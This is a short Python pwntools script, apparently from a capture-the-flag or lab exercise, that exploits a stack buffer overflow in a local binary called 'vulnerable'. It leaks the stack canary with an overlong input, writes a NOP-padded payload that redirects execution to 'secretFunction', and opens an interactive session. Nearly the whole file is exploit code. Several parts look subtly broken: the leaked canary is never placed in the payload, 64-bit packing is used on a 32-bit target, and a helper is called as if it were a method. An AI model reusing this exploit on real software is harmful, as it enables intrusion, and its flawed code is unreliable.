#!/usr/bin/python3
# -*- ascll -*-
# Payload generator
from struct import pack
from pwn import *

def saveShellCode(canary, addr):
        f = open("shellCode", "wb")
        f.write(b"\x90"*408)
        f.write(b"\x0a")
        f.write(b"\x90"*15)
        f.write(addr)
        f.close()

def loadShellCode():
        f = open("shellCode", "rb")
        shellCode = f.read(432)
        f.close()
        
        return shellCode

if __name__ == "__main__":
        context(arch = 'i386', os = 'linux', binary = 'vulnerable', log_level = 'debug', encoding='ASCII')

        elf = ELF("./vulnerable")
        log.info("canary: {}".format(elf.canary))
        log.info("endian: {}".format(elf.endian))

        secretFunction = elf.sym["secretFunction"]
        log.info("secretFunction: {:x}".format(secretFunction))
        getShell = elf.sym["getShell"]
        log.info("getShell: {:x}".format(getShell))

        p = process('./vulnerable', aslr=False)
        p.recvuntil("Enter some text:\n")

        # leak Canary
        payload = "A"*408
        p.sendline(payload)
        p.recvuntil("You entered: " + payload)

        # Canary
        Canary = p.u32() - 0xa
        log.info("Canary: {:x}".format(Canary))

        # Bypass Canary
        saveShellCode(canary=Canary, addr=p64(secretFunction))
        shellCode = loadShellCode()

        log.info("msg: {}".format(shellCode))
        p.send(shellCode)
        p.recv()
        p.interactive()